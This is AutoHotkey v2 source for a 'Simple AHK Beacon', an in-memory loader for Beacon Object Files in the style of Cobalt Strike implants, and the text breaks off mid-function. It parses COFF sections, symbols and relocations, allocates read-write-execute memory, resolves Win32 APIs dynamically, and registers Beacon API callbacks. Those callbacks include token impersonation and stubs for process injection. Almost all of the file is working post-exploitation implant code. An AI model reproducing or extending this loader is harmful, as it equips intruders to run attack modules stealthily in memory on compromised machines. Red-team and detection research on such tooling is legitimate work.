#Requires AutoHotkey v2.0
#SingleInstance Force

; ============================================================================
; Simple AHK Beacon with BOF (Beacon Object File) Support
;=================================================================
; LOGGING FUNCTION
; ============================================================================

BOFLog(msg, prefix := "BOF") {
    timestamp := FormatTime(A_Now, "yyyy-MM-dd HH:mm:ss")
    logMessage := timestamp " [" prefix "] " msg "`n"

    try {
        FileAppend(logMessage, "*")  ; stdout
    } catch Error as err {
        FileAppend(logMessage, "bof_debug.txt")
    }
}

; ============================================================================
; BOF LOADER CLASSES
; ============================================================================

class Relocation {
    ; x64 Relocation type constants
    static IMAGE_REL_AMD64_ADDR64 := 0x0001    ; 64-bit absolute
    static IMAGE_REL_AMD64_ADDR32 := 0x0002    ; 32-bit absolute
    static IMAGE_REL_AMD64_ADDR32NB := 0x0003  ; 32-bit RVA
    static IMAGE_REL_AMD64_REL32 := 0x0004     ; 32-bit relative
    static IMAGE_REL_AMD64_REL32_1 := 0x0005   ; relative - 1
    static IMAGE_REL_AMD64_REL32_2 := 0x0006   ; relative - 2
    static IMAGE_REL_AMD64_REL32_4 := 0x0008   ; relative - 4
    static IMAGE_REL_AMD64_REL32_5 := 0x0009   ; relative - 5

    ; x86 Relocation type constants
    static IMAGE_REL_I386_DIR32 := 0x0006      ; 32-bit absolute
    static IMAGE_REL_I386_DIR32NB := 0x0007    ; 32-bit RVA
    static IMAGE_REL_I386_REL32 := 0x0014      ; 32-bit relative

    __New() {
        ; COFF Relocation entry (10 bytes)
        this.VirtualAddress := 0      ; 4 bytes - offset in section to patch
        this.SymbolTableIndex := 0    ; 4 bytes - index into symbol table
        this.Type := 0                ; 2 bytes - relocation type
    }

    Parse(buffer1, offset) {
        this.VirtualAddress := NumGet(buffer1, offset, "UInt")
        this.SymbolTableIndex := NumGet(buffer1, offset + 4, "UInt")
        this.Type := NumGet(buffer1, offset + 8, "UShort")
        return this
    }
}

class Symbol {
    ; Storage class constants
    static IMAGE_SYM_CLASS_NULL := 0x00
    static IMAGE_SYM_CLASS_EXTERNAL := 0x02
    static IMAGE_SYM_CLASS_STATIC := 0x03
    static IMAGE_SYM_CLASS_LABEL := 0x06

    ; Special section numbers
    static IMAGE_SYM_UNDEFINED := 0      ; External symbol
    static IMAGE_SYM_ABSOLUTE := -1      ; Absolute value
    static IMAGE_SYM_DEBUG := -2         ; Debug symbol

    __New() {
        ; COFF Symbol entry (18 bytes)
        this.NameBytes := Buffer(8, 0)   ; 8 bytes - name or string table offset
        this.Value := 0                  ; 4 bytes - offset within section
        this.SectionNumber := 0          ; 2 bytes - 1-based section index
        this.Type := 0                   ; 2 bytes
        this.StorageClass := 0           ; 1 byte
        this.NumberOfAuxSymbols := 0     ; 1 byte

        ; Resolved data
        this.ResolvedName := ""          ; Full symbol name string
        this.ResolvedAddress := 0        ; Final address after loading
        this.IsExternal := false         ; True if needs external resolution
    }

    Parse(buffer1, offset) {
        ; Copy name bytes
        DllCall("RtlCopyMemory", "Ptr", this.NameBytes, "Ptr", buffer1.Ptr + offset, "UPtr", 8)

        this.Value := NumGet(buffer1, offset + 8, "UInt")
        this.SectionNumber := NumGet(buffer1, offset + 12, "Short")  ; Signed!
        this.Type := NumGet(buffer1, offset + 14, "UShort")
        this.StorageClass := NumGet(buffer1, offset + 16, "UChar")
        this.NumberOfAuxSymbols := NumGet(buffer1, offset + 17, "UChar")

        ; Determine if external
        this.IsExternal := (this.SectionNumber = 0 && this.StorageClass = Symbol.IMAGE_SYM_CLASS_EXTERNAL)

        return this
    }

    ; Check if name is inline (first 4 bytes are zero = string table offset)
    IsNameInStringTable() {
        return NumGet(this.NameBytes, 0, "UInt") = 0
    }

    ; Get string table offset (when name is in string table)
    GetStringTableOffset() {
        return NumGet(this.NameBytes, 4, "UInt")
    }

    ; Get inline name (when name is stored directly in 8 bytes)
    GetInlineName() {
        ; Read up to 8 chars, stop at null
        name := ""
        Loop 8 {
            char := NumGet(this.NameBytes, A_Index - 1, "UChar")
            if (char = 0)
                break
            name .= Chr(char)
        }
        return name
    }
}

class SectionHeader {
    ; Section characteristic flags
    static IMAGE_SCN_CNT_CODE := 0x00000020
    static IMAGE_SCN_CNT_INITIALIZED_DATA := 0x00000040
    static IMAGE_SCN_CNT_UNINITIALIZED_DATA := 0x00000080
    static IMAGE_SCN_MEM_EXECUTE := 0x20000000
    static IMAGE_SCN_MEM_READ := 0x40000000
    static IMAGE_SCN_MEM_WRITE := 0x80000000

    __New() {
        ; COFF Section header (40 bytes)
        this.Name := ""                   ; 8-byte name
        this.VirtualSize := 0             ; 4 bytes
        this.VirtualAddress := 0          ; 4 bytes
        this.SizeOfRawData := 0           ; 4 bytes
        this.PointerToRawData := 0        ; 4 bytes
        this.PointerToRelocations := 0    ; 4 bytes
        this.PointerToLinenumbers := 0    ; 4 bytes (unused)
        this.NumberOfRelocations := 0     ; 2 bytes
        this.NumberOfLinenumbers := 0     ; 2 bytes (unused)
        this.Characteristics := 0         ; 4 bytes

        ; Parsed data
        this.Relocations := []            ; Array of Relocation objects
        this.RawData := ""                ; Buffer containing section bytes
        this.LoadedAddress := 0           ; Address after loading into memory
    }

    Parse(buffer1, offset) {
        ; Read 8-byte name
        nameBytes := Buffer(8, 0)
        DllCall("RtlCopyMemory", "Ptr", nameBytes, "Ptr", buffer1.Ptr + offset, "UPtr", 8)

        ; Convert to string (stop at null)
        this.Name := ""
        Loop 8 {
            char := NumGet(nameBytes, A_Index - 1, "UChar")
            if (char = 0)
                break
            this.Name .= Chr(char)
        }

        this.VirtualSize := NumGet(buffer1, offset + 8, "UInt")
        this.VirtualAddress := NumGet(buffer1, offset + 12, "UInt")
        this.SizeOfRawData := NumGet(buffer1, offset + 16, "UInt")
        this.PointerToRawData := NumGet(buffer1, offset + 20, "UInt")
        this.PointerToRelocations := NumGet(buffer1, offset + 24, "UInt")
        this.PointerToLinenumbers := NumGet(buffer1, offset + 28, "UInt")
        this.NumberOfRelocations := NumGet(buffer1, offset + 32, "UShort")
        this.NumberOfLinenumbers := NumGet(buffer1, offset + 34, "UShort")
        this.Characteristics := NumGet(buffer1, offset + 36, "UInt")

        return this
    }

    ; Parse relocations for this section
    ParseRelocations(buffer1) {
        if (this.NumberOfRelocations = 0 || this.PointerToRelocations = 0)
            return

        this.Relocations := []
        Loop this.NumberOfRelocations {
            offset := this.PointerToRelocations + ((A_Index - 1) * 10)
            reloc := Relocation()
            reloc.Parse(buffer1, offset)
            this.Relocations.Push(reloc)
        }
    }

    ; Load raw data from buffer1
    LoadRawData(buffer1) {
        if (this.SizeOfRawData = 0 || this.PointerToRawData = 0)
            return

        this.RawData := Buffer(this.SizeOfRawData, 0)
        DllCall("RtlCopyMemory",
            "Ptr", this.RawData,
            "Ptr", buffer1.Ptr + this.PointerToRawData,
            "UPtr", this.SizeOfRawData)
    }

    ; Check if section contains code
    IsCode() {
        return (this.Characteristics & SectionHeader.IMAGE_SCN_CNT_CODE) != 0
    }

    ; Check if section is executable
    IsExecutable() {
        return (this.Characteristics & SectionHeader.IMAGE_SCN_MEM_EXECUTE) != 0
    }

    ; Check if section is writable
    IsWritable() {
        return (this.Characteristics & SectionHeader.IMAGE_SCN_MEM_WRITE) != 0
    }
}

class COFFParser {
    ; Machine type constants
    static IMAGE_FILE_MACHINE_I386 := 0x014c
    static IMAGE_FILE_MACHINE_AMD64 := 0x8664

    __New() {
        ; COFF Header fields (20 bytes)
        this.Machine := 0               ; 2 bytes - 0x8664 (x64) or 0x14c (x86)
        this.NumberOfSections := 0      ; 2 bytes
        this.TimeDateStamp := 0         ; 4 bytes
        this.PointerToSymbolTable := 0  ; 4 bytes
        this.NumberOfSymbols := 0       ; 4 bytes
        this.SizeOfOptionalHeader := 0  ; 2 bytes (0 for object files)
        this.Characteristics := 0       ; 2 bytes

        ; Parsed data
        this.Sections := []             ; Array of SectionHeader objects
        this.Symbols := Map()           ; Map of symbol table index -> Symbol object
        this.StringTable := ""          ; Buffer for string table
        this.StringTableSize := 0       ; Size of string table

        ; Raw buffer reference
        this.RawData := ""
    }

    ; Main parse entry point
    Parse(bofData) {
        BOFLog("=== COFF PARSING ===", "PARSER")
        BOFLog(Format("Input BOF size: {} bytes", bofData.Size), "PARSER")

        if (!bofData || bofData.Size < 20) {
            throw Error("Invalid BOF data: too small")
        }

        this.RawData := bofData

        ; Parse COFF header
        this.ParseHeader(bofData)

        ; Validate machine type
        if (this.Machine != COFFParser.IMAGE_FILE_MACHINE_I386
            && this.Machine != COFFParser.IMAGE_FILE_MACHINE_AMD64) {
            throw Error("Unsupported machine type: " . Format("0x{:04X}", this.Machine))
        }

        ; Parse sections
        this.ParseSections(bofData)

        ; Parse string table (must be before symbols for name resolution)
        this.ParseStringTable(bofData)

        ; Parse symbols
        this.ParseSymbols(bofData)

        BOFLog("COFF parsing complete", "PARSER")
        return this
    }

    ParseHeader(buffer1) {
        this.Machine := NumGet(buffer1, 0, "UShort")
        this.NumberOfSections := NumGet(buffer1, 2, "UShort")
        this.TimeDateStamp := NumGet(buffer1, 4, "UInt")
        this.PointerToSymbolTable := NumGet(buffer1, 8, "UInt")
        this.NumberOfSymbols := NumGet(buffer1, 12, "UInt")
        this.SizeOfOptionalHeader := NumGet(buffer1, 16, "UShort")
        this.Characteristics := NumGet(buffer1, 18, "UShort")

        BOFLog(Format("COFF Header: Machine=0x{:04X} ({}) Sections={} Symbols={}",
            this.Machine, this.Is64Bit() ? "x64" : "x86",
            this.NumberOfSections, this.NumberOfSymbols), "PARSER")
    }

    ParseSections(buffer1) {
        ; Section headers start after COFF header (20 bytes) + optional header
        sectionOffset := 20 + this.SizeOfOptionalHeader

        this.Sections := []
        Loop this.NumberOfSections {
            section := SectionHeader()
            section.Parse(buffer1, sectionOffset + ((A_Index - 1) * 40))
            section.LoadRawData(buffer1)
            section.ParseRelocations(buffer1)
            this.Sections.Push(section)

            BOFLog(Format("  Section[{}]: '{}' Size={} Relocs={} Chars=0x{:08X}",
                A_Index, section.Name, section.SizeOfRawData,
                section.NumberOfRelocations, section.Characteristics), "PARSER")
        }
    }

    ParseStringTable(buffer1) {
        ; String table is immediately after symbol table
        ; First 4 bytes are the size of the string table (including size field)
        stringTableOffset := this.PointerToSymbolTable + (this.NumberOfSymbols * 18)

        if (stringTableOffset + 4 > buffer1.Size) {
            this.StringTableSize := 0
            BOFLog("String table: not present", "PARSER")
            return
        }

        this.StringTableSize := NumGet(buffer1, stringTableOffset, "UInt")

        if (this.StringTableSize > 4) {
            this.StringTable := Buffer(this.StringTableSize, 0)
            DllCall("RtlCopyMemory",
                "Ptr", this.StringTable,
                "Ptr", buffer1.Ptr + stringTableOffset,
                "UPtr", this.StringTableSize)
        }

        BOFLog(Format("String table: {} bytes", this.StringTableSize), "PARSER")
    }

    ParseSymbols(buffer1) {
        if (this.NumberOfSymbols = 0 || this.PointerToSymbolTable = 0) {
            BOFLog("No symbols to parse", "PARSER")
            return
        }

        this.Symbols := Map()
        symbolIndex := 0
        externalCount := 0
        parsedCount := 0

        BOFLog(Format("Starting symbol parsing: {} symbols at offset 0x{:X}", this.NumberOfSymbols, this.PointerToSymbolTable), "PARSER")

        while (symbolIndex < this.NumberOfSymbols) {
            try {
                offset := this.PointerToSymbolTable + (symbolIndex * 18)

                sym := Symbol()
                sym.Parse(buffer1, offset)

                ; Resolve symbol name
                sym.ResolvedName := this.GetSymbolName(sym)

                ; Store by original symbol table index (0-based)
                this.Symbols[symbolIndex] := sym
                parsedCount++

                if (sym.IsExternal) {
                    externalCount++
                    BOFLog(Format("  Symbol[{}]: '{}' (EXTERNAL)", symbolIndex, sym.ResolvedName), "PARSER")
                }

                ; Skip aux symbols (they share indices in the symbol table)
                symbolIndex += 1 + sym.NumberOfAuxSymbols
            } catch as err {
                BOFLog(Format("ERROR at symbol index {}: {} (Line: {})", symbolIndex, err.Message, err.Line), "PARSER")
                throw err
            }
        }

        BOFLog(Format("Parsed {} symbols ({} external imports)", parsedCount, externalCount), "PARSER")
    }

    ; Resolve symbol name from inline or string table
    GetSymbolName(sym) {
        try {
            if (sym.IsNameInStringTable()) {
                ; Name is in string table
                tableOffset := sym.GetStringTableOffset()
                if (this.StringTable && tableOffset > 0 && tableOffset < this.StringTableSize) {
                    ; Read null-terminated string from string table
                    name := ""
                    pos := tableOffset
                    while (pos < this.StringTableSize) {
                        char := NumGet(this.StringTable, pos, "UChar")
                        if (char = 0)
                            break
                        name .= Chr(char)
                        pos++
                    }
                    return name
                }
                return Format("<invalid_offset:{}>", tableOffset)
            } else {
                ; Name is inline (8 bytes max)
                return sym.GetInlineName()
            }
        } catch as err {
            BOFLog(Format("GetSymbolName error: {}", err.Message), "PARSER")
            return "<error>"
        }
    }

    ; Check if this is a 64-bit object file
    Is64Bit() {
        return this.Machine = COFFParser.IMAGE_FILE_MACHINE_AMD64
    }

    ; Find a symbol by name
    FindSymbol(name) {
        for index, sym in this.Symbols {
            if (sym.ResolvedName = name)
                return sym
        }
        return ""
    }

    ; Find entry point symbol (go or _go)
    FindEntryPoint() {
        ; Try common entry point names
        for entryName in ["go", "_go", "Go", "_Go"] {
            sym := this.FindSymbol(entryName)
            if (sym)
                return sym
        }
        return ""
    }

    ; Get section by 1-based index
    GetSection(index) {
        if (index >= 1 && index <= this.Sections.Length)
            return this.Sections[index]
        return ""
    }

    ; Debug: Print parsed info
    DumpInfo() {
        info := "=== COFF Header ===`n"
        info .= Format("Machine: 0x{:04X} ({})`n", this.Machine, this.Is64Bit() ? "x64" : "x86")
        info .= Format("Sections: {}`n", this.NumberOfSections)
        info .= Format("Symbols: {}`n", this.NumberOfSymbols)
        info .= Format("String Table Size: {}`n", this.StringTableSize)

        info .= "`n=== Sections ===`n"
        for section in this.Sections {
            info .= Format("{}: Size={}, Relocs={}, Chars=0x{:08X}`n",
                section.Name, section.SizeOfRawData,
                section.NumberOfRelocations, section.Characteristics)
        }

        info .= "`n=== Symbols ===`n"
        for index, sym in this.Symbols {
            info .= Format("[{}] {}: Section={}, Value=0x{:08X}, Class=0x{:02X}, External={}`n",
                index, sym.ResolvedName, sym.SectionNumber,
                sym.Value, sym.StorageClass, sym.IsExternal)
        }

        return info
    }
}

; ============================================================================
; Memory Management
; ============================================================================

class MemoryManager {
    Allocations := []

    __New() {
        this.Allocations := []
    }

    ; Allocate RWX memory for code sections
    AllocateRWX(size) {
        ; MEM_COMMIT | MEM_RESERVE = 0x3000
        ; PAGE_EXECUTE_READWRITE = 0x40
        addr := DllCall("VirtualAlloc",
            "Ptr", 0,
            "Ptr", size,
            "UInt", 0x3000,
            "UInt", 0x40,
            "Ptr")

        if (!addr)
            throw Error("VirtualAlloc RWX failed: " . A_LastError)

        this.Allocations.Push(addr)
        BOFLog(Format("Allocated RWX: 0x{:016X} ({} bytes)", addr, size), "MEMORY")
        return addr
    }

    ; Allocate RW memory for data sections
    AllocateRW(size) {
        ; MEM_COMMIT | MEM_RESERVE = 0x3000
        ; PAGE_READWRITE = 0x04
        addr := DllCall("VirtualAlloc",
            "Ptr", 0,
            "Ptr", size,
            "UInt", 0x3000,
            "UInt", 0x04,
            "Ptr")

        if (!addr)
            throw Error("VirtualAlloc RW failed: " . A_LastError)

        this.Allocations.Push(addr)
        BOFLog(Format("Allocated RW: 0x{:016X} ({} bytes)", addr, size), "MEMORY")
        return addr
    }

    ; Free a specific allocation
    Free(address) {
        ; MEM_RELEASE = 0x8000
        result := DllCall("VirtualFree", "Ptr", address, "Ptr", 0, "UInt", 0x8000)

        ; Remove from tracking
        newAllocs := []
        for addr in this.Allocations {
            if (addr != address)
                newAllocs.Push(addr)
        }
        this.Allocations := newAllocs

        return result
    }

    ; Free all tracked allocations
    FreeAll() {
        if (this.Allocations.Length > 0) {
            BOFLog(Format("Freeing {} memory allocations", this.Allocations.Length), "MEMORY")
            for addr in this.Allocations {
                DllCall("VirtualFree", "Ptr", addr, "Ptr", 0, "UInt", 0x8000)
            }
            this.Allocations := []
        }
    }

    ; Copy bytes to destination
    WriteBytes(dest, src, size) {
        DllCall("RtlCopyMemory", "Ptr", dest, "Ptr", src, "UPtr", size)
    }

    ; Change memory protection
    SetProtection(address, size, protection) {
        oldProtect := 0
        result := DllCall("VirtualProtect",
            "Ptr", address,
            "Ptr", size,
            "UInt", protection,
            "UInt*", &oldProtect)
        return result
    }

    __Delete() {
        this.FreeAll()
    }
}

; ============================================================================
; Symbol Resolution
; ============================================================================

class APIResolver {
    ; Cache of loaded module handles (module name -> HMODULE)
    LoadedModules := Map()

    ; Cache of resolved API addresses (full symbol name -> address)
    ResolvedAPIs := Map()

    ; Reference to BeaconAPI for internal function resolution
    BeaconAPI := ""

    __New(beaconAPI := "") {
        this.BeaconAPI := beaconAPI
    }

    ; Main resolution entry point - takes a COFF symbol name and returns address
    ResolveImport(symbolName) {
        ; Check cache first
        if (this.ResolvedAPIs.Has(symbolName)) {
            return this.ResolvedAPIs[symbolName]
        }

        ; Parse the import name to get module and function
        parsed := this.ParseImportName(symbolName)

        if (!parsed) {
            ; Not an import symbol, return 0
            return 0
        }

        address := 0

        if (parsed.isBeaconAPI) {
            ; Internal Beacon API function
            address := this.ResolveBeaconFunction(parsed.function)
            if (address) {
                BOFLog(Format("Resolved Beacon API: {} -> 0x{:016X}", parsed.function, address), "RESOLVER")
            } else {
                BOFLog(Format("FAILED to resolve Beacon API: {}", parsed.function), "RESOLVER")
            }
        } else {
            ; External Win32 API
            address := this.ResolveWin32API(parsed.module, parsed.function)
            if (address) {
                BOFLog(Format("Resolved Win32 API: {}!{} -> 0x{:016X}", parsed.module, parsed.function, address), "RESOLVER")
            } else {
                BOFLog(Format("FAILED to resolve Win32 API: {}!{}", parsed.module, parsed.function), "RESOLVER")
            }
        }

        ; Cache the result
        if (address) {
            this.ResolvedAPIs[symbolName] := address
        }

        return address
    }

    ; Parse import symbol name format
    ; Formats:
    ;   __imp_KERNEL32$CreateFileA  -> {module: "KERNEL32", function: "CreateFileA"}
    ;   __imp_BeaconPrintf          -> {module: "", function: "BeaconPrintf", isBeaconAPI: true}
    ;   KERNEL32$CreateFileA        -> {module: "KERNEL32", function: "CreateFileA"}
    ;   BeaconOutput                -> {module: "", function: "BeaconOutput", isBeaconAPI: true}
    ParseImportName(symbolName) {
        name := symbolName

        ; Strip __imp_ prefix if present
        if (SubStr(name, 1, 6) = "__imp_") {
            name := SubStr(name, 7)
        }

        ; Check for MODULE$FUNCTION format
        dollarPos := InStr(name, "$")

        if (dollarPos) {
            ; External Win32 API
            moduleName := SubStr(name, 1, dollarPos - 1)
            funcName := SubStr(name, dollarPos + 1)

            return {
                module: moduleName,
                function: funcName,
                isBeaconAPI: false
            }
        } else {
            ; Check if it's a Beacon API function
            if (this.IsBeaconFunction(name)) {
                return {
                    module: "",
                    function: name,
                    isBeaconAPI: true
                }
            }

            ; Unknown format - might be internal symbol
            return ""
        }
    }

    ; Check if function name is a known Beacon API function
    IsBeaconFunction(funcName) {
        ; List of all Beacon API functions from beacon.h
        beaconFuncs := [
            "BeaconDataParse",
            "BeaconDataPtr",
            "BeaconDataInt",
            "BeaconDataShort",
            "BeaconDataLength",
            "BeaconDataExtract",
            "BeaconFormatAlloc",
            "BeaconFormatReset",
            "BeaconFormatFree",
            "BeaconFormatAppend",
            "BeaconFormatPrintf",
            "BeaconFormatToString",
            "BeaconFormatInt",
            "BeaconPrintf",
            "BeaconOutput",
            "BeaconUseToken",
            "BeaconRevertToken",
            "BeaconIsAdmin",
            "BeaconGetSpawnTo",
            "BeaconInjectProcess",
            "BeaconInjectTemporaryProcess",
            "BeaconCleanupProcess",
            "toWideChar",
            "getOSMinorVersion",
            "getOSMajorVersion"
        ]

        for fn in beaconFuncs {
            if (fn = funcName)
                return true
        }
        return false
    }

    ; Resolve a Win32 API function
    ResolveWin32API(moduleName, funcName) {
        ; Get or load the module
        hModule := this.GetModule(moduleName)

        if (!hModule) {
            return 0
        }

        ; Get function address
        address := DllCall("GetProcAddress",
            "Ptr", hModule,
            "AStr", funcName,
            "Ptr")

        if (!address) {
            ; Try with 'A' suffix for ANSI version
            address := DllCall("GetProcAddress",
                "Ptr", hModule,
                "AStr", funcName . "A",
                "Ptr")
        }

        if (!address) {
            ; Try with 'W' suffix for Wide version
            address := DllCall("GetProcAddress",
                "Ptr", hModule,
                "AStr", funcName . "W",
                "Ptr")
        }

        return address
    }

    ; Get a module handle, loading it if necessary
    GetModule(moduleName) {
        ; Normalize module name to uppercase
        moduleKey := StrUpper(moduleName)

        ; Check cache
        if (this.LoadedModules.Has(moduleKey)) {
            return this.LoadedModules[moduleKey]
        }

        ; Try to get already-loaded module first
        hModule := DllCall("GetModuleHandleA",
            "AStr", moduleName,
            "Ptr")

        if (!hModule) {
            ; Module not loaded, try to load it
            ; Add .dll extension if not present
            if (!InStr(moduleName, ".")) {
                moduleName .= ".dll"
            }

            hModule := DllCall("LoadLibraryA",
                "AStr", moduleName,
                "Ptr")

            if (hModule) {
                BOFLog(Format("Loaded module: {} -> 0x{:016X}", moduleName, hModule), "RESOLVER")
            }
        }

        if (hModule) {
            this.LoadedModules[moduleKey] := hModule
        }

        return hModule
    }

    ; Resolve a Beacon API function to a callback address
    ResolveBeaconFunction(funcName) {
        if (!this.BeaconAPI) {
            return 0
        }

        ; Get the function pointer from BeaconAPI
        return this.BeaconAPI.GetFunctionPointer(funcName)
    }

    ; Get all resolved imports for debugging
    DumpResolved() {
        info := "=== Resolved Imports ===`n"

        for name, addr in this.ResolvedAPIs {
            info .= Format("{}: 0x{:016X}`n", name, addr)
        }

        info .= "`n=== Loaded Modules ===`n"
        for name, handle in this.LoadedModules {
            info .= Format("{}: 0x{:016X}`n", name, handle)
        }

        return info
    }
}

class BeaconAPI {
    ; Output collection
    OutputBuffer := ""

    ; Callback handles (must be stored to prevent garbage collection)
    Callbacks := Map()

    ; Data parser state (for BOF argument parsing)
    ParserData := Map()  ; parser handle -> {buffer1, position, length}

    ; Format buffers
    FormatBuffers := Map()  ; format handle -> {buffer1, position, maxlen}

    ; Current token handle (for token impersonation)
    CurrentToken := 0

    __New() {
        this.OutputBuffer := ""
        this.CreateCallbacks()
    }

    ; Create all native callbacks for Beacon API functions
    CreateCallbacks() {
        ; Output functions
        ; BeaconPrintf is variadic: void BeaconPrintf(int type, char* fmt, ...)
        ; We accept up to 10 params total (type, fmt, + 8 format args) to handle most BOF use cases
        this.Callbacks["BeaconPrintf"] := CallbackCreate(ObjBindMethod(this, "_BeaconPrintf"), "C", 10)
        this.Callbacks["BeaconOutput"] := CallbackCreate(ObjBindMethod(this, "_BeaconOutput"), "C", 3)

        ; Data parsing functions
        this.Callbacks["BeaconDataParse"] := CallbackCreate(ObjBindMethod(this, "_BeaconDataParse"), "C", 3)
        this.Callbacks["BeaconDataPtr"] := CallbackCreate(ObjBindMethod(this, "_BeaconDataPtr"), "C", 2)
        this.Callbacks["BeaconDataInt"] := CallbackCreate(ObjBindMethod(this, "_BeaconDataInt"), "C", 1)
        this.Callbacks["BeaconDataShort"] := CallbackCreate(ObjBindMethod(this, "_BeaconDataShort"), "C", 1)
        this.Callbacks["BeaconDataLength"] := CallbackCreate(ObjBindMethod(this, "_BeaconDataLength"), "C", 1)
        this.Callbacks["BeaconDataExtract"] := CallbackCreate(ObjBindMethod(this, "_BeaconDataExtract"), "C", 2)

        ; Format functions
        this.Callbacks["BeaconFormatAlloc"] := CallbackCreate(ObjBindMethod(this, "_BeaconFormatAlloc"), "C", 2)
        this.Callbacks["BeaconFormatReset"] := CallbackCreate(ObjBindMethod(this, "_BeaconFormatReset"), "C", 1)
        this.Callbacks["BeaconFormatFree"] := CallbackCreate(ObjBindMethod(this, "_BeaconFormatFree"), "C", 1)
        this.Callbacks["BeaconFormatAppend"] := CallbackCreate(ObjBindMethod(this, "_BeaconFormatAppend"), "C", 3)
        this.Callbacks["BeaconFormatPrintf"] := CallbackCreate(ObjBindMethod(this, "_BeaconFormatPrintf"), "C", 3)
        this.Callbacks["BeaconFormatToString"] := CallbackCreate(ObjBindMethod(this, "_BeaconFormatToString"), "C", 2)
        this.Callbacks["BeaconFormatInt"] := CallbackCreate(ObjBindMethod(this, "_BeaconFormatInt"), "C", 2)

        ; Token functions
        this.Callbacks["BeaconUseToken"] := CallbackCreate(ObjBindMethod(this, "_BeaconUseToken"), "C", 1)
        this.Callbacks["BeaconRevertToken"] := CallbackCreate(ObjBindMethod(this, "_BeaconRevertToken"), "C", 0)
        this.Callbacks["BeaconIsAdmin"] := CallbackCreate(ObjBindMethod(this, "_BeaconIsAdmin"), "C", 0)

        ; Utility functions
        this.Callbacks["toWideChar"] := CallbackCreate(ObjBindMethod(this, "_toWideChar"), "C", 3)
        this.Callbacks["getOSMajorVersion"] := CallbackCreate(ObjBindMethod(this, "_getOSMajorVersion"), "C", 0)
        this.Callbacks["getOSMinorVersion"] := CallbackCreate(ObjBindMethod(this, "_getOSMinorVersion"), "C", 0)

        ; Process injection stubs (limited implementation)
        this.Callbacks["BeaconGetSpawnTo"] := CallbackCreate(ObjBindMethod(this, "_BeaconGetSpawnTo"), "C", 3)
        this.Callbacks["BeaconInjectProcess"] := CallbackCreate(ObjBindMethod(this, "_BeaconInjectProcess"), "C", 7)
        this.Callbacks["BeaconInjectTemporaryProcess"] := CallbackCreate(ObjBindMethod(this, "_BeaconInjectTemporaryProcess"), "C", 6)
        this.Callbacks["BeaconCleanupProcess"] := CallbackCreate(ObjBindMethod(this, "_BeaconCleanupProcess"), "C", 1)
    }

    ; Get function pointer by name
    GetFunctionPointer(funcName) {
        if (this.Callbacks.Has(funcName)) {
            return this.Callbacks[funcName]
        }
        return 0
    }

    ; Get collected output
    GetOutput() {
        return this.OutputBuffer
    }

    ; Clear output buffer1
    ClearOutput() {
        this.OutputBuffer := ""
    }

    ; ========================================================================
    ; OUTPUT FUNCTIONS
    ; ========================================================================

    ; void BeaconPrintf(int type, char* fmt, ...)
    _BeaconPrintf(type, fmtPtr, arg1:=0, arg2:=0, arg3:=0, arg4:=0, arg5:=0, arg6:=0, arg7:=0, arg8:=0) {
        ; BeaconPrintf is variadic: void BeaconPrintf(int type, char* fmt, ...)
        ; We use wsprintfA to format the string with the provided arguments
        BOFLog(">>> BeaconPrintf CALLED <<<", "API")
        try {
            if (fmtPtr) {
                fmtStr := StrGet(fmtPtr, "UTF-8")

                ; Allocate output buffer (max 1024 chars for wsprintf)
                outBuf := Buffer(1024, 0)

                ; Count format specifiers to determine how many args to pass
                ; Common specifiers: %s, %d, %i, %u, %x, %X, %p, %c, %ld, %lu, %lx, %lld, %llu
                numSpecs := 0
                pos := 1
                while (pos := InStr(fmtStr, "%", , pos)) {
                    nextChar := SubStr(fmtStr, pos + 1, 1)
                    ; Skip %% (literal percent)
                    if (nextChar != "%") {
                        numSpecs++
                    }
                    pos++
                }

                ; Call wsprintfA with the appropriate number of arguments
                if (numSpecs = 0) {
                    ; No format specifiers, just copy the string
                    text := fmtStr
                } else if (numSpecs = 1) {
                    DllCall("user32\wsprintfA", "Ptr", outBuf.Ptr, "AStr", fmtStr, "Ptr", arg1, "Int")
                    text := StrGet(outBuf.Ptr, "UTF-8")
                } else if (numSpecs = 2) {
                    DllCall("user32\wsprintfA", "Ptr", outBuf.Ptr, "AStr", fmtStr, "Ptr", arg1, "Ptr", arg2, "Int")
                    text := StrGet(outBuf.Ptr, "UTF-8")
                } else if (numSpecs = 3) {
                    DllCall("user32\wsprintfA", "Ptr", outBuf.Ptr, "AStr", fmtStr, "Ptr", arg1, "Ptr", arg2, "Ptr", arg3, "Int")
                    text := StrGet(outBuf.Ptr, "UTF-8")
                } else if (numSpecs = 4) {
                    DllCall("user32\wsprintfA", "Ptr", outBuf.Ptr, "AStr", fmtStr, "Ptr", arg1, "Ptr", arg2, "Ptr", arg3, "Ptr", arg4, "Int")
                    text := StrGet(outBuf.Ptr, "UTF-8")
                } else if (numSpecs = 5) {
                    DllCall("user32\wsprintfA", "Ptr", outBuf.Ptr, "AStr", fmtStr, "Ptr", arg1, "Ptr", arg2, "Ptr", arg3, "Ptr", arg4, "Ptr", arg5, "Int")
                    text := StrGet(outBuf.Ptr, "UTF-8")
                } else if (numSpecs = 6) {
                    DllCall("user32\wsprintfA", "Ptr", outBuf.Ptr, "AStr", fmtStr, "Ptr", arg1, "Ptr", arg2, "Ptr", arg3, "Ptr", arg4, "Ptr", arg5, "Ptr", arg6, "Int")
                    text := StrGet(outBuf.Ptr, "UTF-8")
                } else if (numSpecs = 7) {
                    DllCall("user32\wsprintfA", "Ptr", outBuf.Ptr, "AStr", fmtStr, "Ptr", arg1, "Ptr", arg2, "Ptr", arg3, "Ptr", arg4, "Ptr", arg5, "Ptr", arg6, "Ptr", arg7, "Int")
                    text := StrGet(outBuf.Ptr, "UTF-8")
                } else {
                    ; 8 or more specifiers
                    DllCall("user32\wsprintfA", "Ptr", outBuf.Ptr, "AStr", fmtStr, "Ptr", arg1, "Ptr", arg2, "Ptr", arg3, "Ptr", arg4, "Ptr", arg5, "Ptr", arg6, "Ptr", arg7, "Ptr", arg8, "Int")
                    text := StrGet(outBuf.Ptr, "UTF-8")
                }

                this.OutputBuffer .= text . "`n"
                BOFLog(Format("BeaconPrintf(type={}) -> '{}'", type, SubStr(text, 1, 200)), "API")
            }
        } catch as err {
            BOFLog(Format("BeaconPrintf ERROR: {}", err.Message), "API")
        }
        return 0
    }

    ; void BeaconOutput(int type, char* data, int len)
    _BeaconOutput(type, dataPtr, len) {
        BOFLog(">>> BeaconOutput CALLED <<<", "API")
        try {
            if (dataPtr && len > 0) {
                text := StrGet(dataPtr, len, "UTF-8")
                this.OutputBuffer .= text
                BOFLog(Format("BeaconOutput(type={}, len={}) -> '{}'", type, len, SubStr(text, 1, 100)), "API")
            }
        } catch as err {
